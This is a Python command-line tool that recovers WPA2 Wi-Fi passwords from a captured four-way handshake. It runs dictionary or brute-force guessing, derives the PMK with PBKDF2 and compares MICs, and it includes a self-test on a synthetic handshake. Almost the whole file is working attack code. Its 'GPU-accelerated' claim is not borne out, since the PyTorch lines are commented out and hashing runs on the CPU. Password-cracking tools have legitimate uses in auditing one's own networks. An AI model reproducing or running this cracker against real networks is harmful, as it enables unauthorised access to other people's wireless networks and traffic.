#!/usr/bin/env python3
"""
GPU-accelerated WPA2 handshake cracker using PyTorch.
Supports dictionary attacks, on-the-fly bruteforce, and a self-test mode.
"""
import argparse
import json
# import torch
import os
import time
import itertools
import hashlib
from tqdm import tqdm
from mic_calculator import hexstr_to_bytes, mac_to_bytes, derive_keys_from_pmk, compute_mic

# --- GPU/CPU Device Setup ---
# Set up the device to use the GPU if available, otherwise fall back to the CPU.
# device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
# if device.type == 'cuda':
#     print(f"[+] GPU detected: {torch.cuda.get_device_name(0)}")
# else:
#     print("[-] No GPU detected. Running on CPU (will be much slower).")

# --- Core Cracking Logic ---

def load_handshake(path):
    """Loads and validates handshake data from a JSON file."""
    try:
        with open(path, 'r') as f:
            data = json.load(f)
        # Convert hex strings to bytes for all necessary fields
        return {
            'ssid': data['ssid'],
            'ap_mac': mac_to_bytes(data['ap_mac']),
            'client_mac': mac_to_bytes(data['client_mac']),
            'anonce': hexstr_to_bytes(data['anonce']),
            'snonce': hexstr_to_bytes(data['snonce']),
            'mic': hexstr_to_bytes(data['mic']),
            'eapol': hexstr_to_bytes(data['eapol'])
        }
    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        print(f"[!] Error loading handshake file '{path}': {e}")
        return None

def torch_pbkdf2_hmac_sha1(password_batch, ssid_bytes, iterations=4096, key_length=32):
    """
    Computes PBKDF2-HMAC-SHA1 to derive the Pairwise Master Key (PMK).
    NOTE: This is a placeholder for a true GPU kernel. It uses Python's hashlib
    but is structured to process batches, which is how a real GPU implementation would work.
    """
    pmks = []
    for password in password_batch:
        password_bytes = password.encode('utf-8')
        pmk = hashlib.pbkdf2_hmac('sha1', password_bytes, ssid_bytes, iterations, key_length)
        pmks.append(pmk)
    return pmks

def batch_process_passwords(handshake, password_batch):
    """
    Processes a batch of passwords against the handshake data. This is the
    most performance-critical part of the cracker.
    """
    ssid_bytes = handshake['ssid'].encode('utf-8')
    pmks = torch_pbkdf2_hmac_sha1(password_batch, ssid_bytes)

    for i, pmk_bytes in enumerate(pmks):
        _, ptk = derive_keys_from_pmk(
            pmk_bytes,
            handshake['ap_mac'],
            handshake['client_mac'],
            handshake['anonce'],
            handshake['snonce']
        )
        mic = compute_mic(ptk, handshake['eapol'])
        if mic[:16] == handshake['mic'][:16]:
            return password_batch[i]
    return None

# --- Attack Mode Functions ---

def crack_with_wordlist(handshake, wordlist, batch_size):
    """Helper function to perform a dictionary attack from a list of passwords."""
    total_passwords = len(wordlist)
    if total_passwords == 0:
        print("[!] Wordlist is empty.")
        return None

    print(f"[*] Processing {total_passwords:,} passwords in batches of {batch_size}.")
    start_time = time.time()
    found_password = None

    with tqdm(total=total_passwords, unit='pass', desc="Cracking") as pbar:
        for i in range(0, total_passwords, batch_size):
            batch = wordlist[i:i + batch_size]
            result = batch_process_passwords(handshake, batch)
            if result:
                found_password = result
                pbar.n = total_passwords
                pbar.refresh()
                break
            pbar.update(len(batch))

    elapsed = time.time() - start_time
    passwords_per_second = total_passwords / elapsed if elapsed > 0 else 0

    if found_password:
        print(f"\n[+] SUCCESS! Password found: {found_password}")
    else:
        print("\n[-] Password not found in the wordlist.")

    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
    print(f"[*] Speed: ~{passwords_per_second:,.2f} passwords/second")
    return found_password

def crack_with_bruteforce(handshake, charset, min_len, max_len, batch_size):
    """Performs an efficient on-the-fly bruteforce attack."""
    print(f"[*] Starting bruteforce attack with charset: '{charset}'")
    print(f"[*] Password length range: {min_len} to {max_len}")
    start_time = time.time()
    total_tried = 0
    found_password = None

    for length in range(min_len, max_len + 1):
        if found_password: break
        num_combinations = len(charset) ** length
        print(f"\n[*] Generating and testing {num_combinations:,} combinations of length {length}...")
        password_generator = (''.join(p) for p in itertools.product(charset, repeat=length))
        batch = []
        with tqdm(total=num_combinations, unit='pass', desc=f"Length {length}") as pbar:
            for password in password_generator:
                if found_password: break
                batch.append(password)
                if len(batch) == batch_size:
                    result = batch_process_passwords(handshake, batch)
                    if result:
                        found_password = result
                        pbar.n = num_combinations
                        pbar.refresh()
                        break
                    total_tried += len(batch)
                    pbar.update(len(batch))
                    batch = []
            if batch and not found_password:
                result = batch_process_passwords(handshake, batch)
                if result: found_password = result
                total_tried += len(batch)
                pbar.update(len(batch))
    
    elapsed = time.time() - start_time
    passwords_per_second = total_tried / elapsed if elapsed > 0 else 0
    if found_password:
        print(f"\n[+] SUCCESS! Password found: {found_password}")
    else:
        print(f"\n[-] Password not found within the specified bruteforce constraints.")
    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
    print(f"[*] Total passwords tried: {total_tried:,}")
    print(f"[*] Speed: ~{passwords_per_second:,.2f} passwords/second")
    return found_password

# --- Self-Test Functionality ---

def create_test_handshake(ssid, password):
    """Creates a valid, in-memory handshake for testing purposes."""
    pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
    ap_mac = mac_to_bytes("e8:48:b8:f0:0f:9c")
    client_mac = mac_to_bytes("e8:48:b8:f0:0f:9c")
    # anonce = os.urandom(32)
    # snonce = os.urandom(32)
    anonce = hexstr_to_bytes("76e0fa8666752b2fdedcb97b3fe23b14a4af5a13c0ad6ad60bf9dd5afd13b088")
    snonce = hexstr_to_bytes("e2d138df8b21997793e07ab909c9b72f083da70bcdf3c2f2a9471b61fa840a1d")
    _, ptk = derive_keys_from_pmk(pmk, ap_mac, client_mac, anonce, snonce)
    # A valid but arbitrary EAPOL frame. The content doesn't matter, only that it's consistent.
    eapol = bytes.fromhex("0103007502010A00000000000000000001E2D138DF8B21997793E07AB909C9B72F083DA70BCDF3C2F2A9471B61FA840A1D000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000FAC040100000FAC040100000FAC028000")
    mic = compute_mic(ptk, eapol)
    print("Calculated Mic: ",mic.hex())
    return {
        'ssid': ssid, 'ap_mac': ap_mac, 'client_mac': client_mac,
        'anonce': anonce, 'snonce': snonce, 'mic': mic, 'eapol': eapol
    }

def run_self_test():
    """Runs a self-contained test to verify the cracking logic."""
    print("\n" + "="*60)
    print("               RUNNING SELF-TEST")
    print("="*60)
    test_password = "43742332"
    test_ssid = "4010"
    print(f"[*] Creating a test handshake for SSID '{test_ssid}' with password '{test_password}'...")
    handshake = create_test_handshake(test_ssid, test_password)
    
    test_wordlist = [
        "wrongpassword",
        "12345678",
        "guess",
        test_password, # The correct password
        "anotherguess"
    ]
    
    print("[*] Running cracker against the test handshake...")
    result = crack_with_wordlist(handshake, test_wordlist, batch_size=10)
    
    if result == test_password:
        print("\n[+] SELF-TEST PASSED! The cracking logic is working correctly.")
    else:
        print("\n[-] SELF-TEST FAILED! The cracker did not find the correct password.")
    print("="*60 + "\n")

# --- Main Execution ---

def main():
    """Parses command-line arguments and initiates the selected cracking mode."""
    parser = argparse.ArgumentParser(
        description="GPU-accelerated WPA2 handshake cracker.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    # A separate group for the main modes
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument('--handshake', help='Path to the JSON file with handshake data.')
    mode_group.add_argument('--self-test', action='store_true', help='Run a self-test to verify functionality.')

    # A group for attack types, only relevant if --handshake is used
    attack_group = parser.add_argument_group('Attack Options (requires --handshake)')
    attack_type_group = attack_group.add_mutually_exclusive_group()
    attack_type_group.add_argument('--wordlist', help='Path to a password wordlist file (dictionary attack).')
    attack_type_group.add_argument('--bruteforce', action='store_true', help='Enable on-the-fly bruteforce attack.')

    brute_group = parser.add_argument_group('Bruteforce Options (requires --bruteforce)')
    brute_group.add_argument('--charset', default='abcdefghijklmnopqrstuvwxyz0123456789', help='Character set for bruteforce.')
    brute_group.add_argument('--min-length', type=int, default=8, help='Minimum password length for bruteforce.')
    brute_group.add_argument('--max-length', type=int, default=10, help='Maximum password length for bruteforce.')

    parser.add_argument('--batch-size', type=int, default=2048, help='Passwords to process per batch.')
    args = parser.parse_args()

    if args.self_test:
        run_self_test()
        return

    # If not self-testing, a handshake is required.
    if args.handshake:
        handshake = load_handshake(args.handshake)
        if not handshake: return

        if args.wordlist:
            try:
                with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                crack_with_wordlist(handshake, passwords, args.batch_size)
            except FileNotFoundError:
                print(f"[!] Wordlist file not found: {args.wordlist}")
        elif args.bruteforce:
            if args.min_length > args.max_length:
                print("[!] Error: --min-length cannot be greater than --max-length.")
                return
            crack_with_bruteforce(handshake, args.charset, args.min_length, args.max_length, args.batch_size)
        else:
            print("[!] You must specify an attack type for the handshake: --wordlist or --bruteforce.")

if __name__ == '__main__':
    main()
